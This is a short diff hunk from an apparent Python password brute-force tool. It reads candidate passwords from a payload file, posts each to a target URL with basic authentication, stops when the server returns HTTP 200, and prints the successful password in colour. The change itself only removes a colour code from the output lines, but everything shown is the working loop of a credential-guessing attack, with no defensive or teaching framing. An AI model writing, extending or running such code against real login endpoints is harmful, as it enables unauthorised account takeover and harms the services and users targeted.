@@ -23,11 +23,11 @@ with open(pyld) as payload:
     x = requests.post(url, data = myobj, auth = (usr, pswd))
     progress = int(i / len(lines) * 100) + 1
     if x.status_code == 200:
-      sys.stdout.write(f"\r{white}{x.status_code} {i}/{len(lines)} %{progress} {green}{pswd}{r}        ")
+      sys.stdout.write(f"\r{x.status_code} {i}/{len(lines)} %{progress} {green}{pswd}{r}        ")
       sys.stdout.flush()
       break
     else:
-      sys.stdout.write(f"\r{white}{x.status_code} {i}/{len(lines)} %{progress} {red}{pswd}{r}        ")
+      sys.stdout.write(f"\r{x.status_code} {i}/{len(lines)} %{progress} {red}{pswd}{r}        ")
       sys.stdout.flush()
     
 print() # To prevent the % character
